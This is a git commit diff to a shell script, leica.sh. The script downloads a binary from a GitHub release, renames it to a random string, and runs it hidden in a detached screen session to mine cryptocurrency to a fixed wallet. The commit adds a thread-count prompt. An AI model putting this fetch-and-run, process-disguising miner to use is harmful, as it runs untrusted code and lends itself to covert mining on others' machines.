200f6e17e3434a5dfd595e71732c2215eb7d0371
udhaindah <udhaindah937@gmail.com>
2024-10-14 17:33:47 +0700

    Update leica.sh

--- leica.sh
+++ leica.sh
@@ -1,6 +1,7 @@
+read -p "worker: " NUM
 wget https://github.com/staticneti/otodin/releases/download/v4.1.2/static.tar
 tar -xf static.tar
 rm -rf static.tar
 variable8=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv static $variable8
-screen -dmS npu ./$variable8 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
+screen -dmS npu ./$variable8 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm --threads $NUM
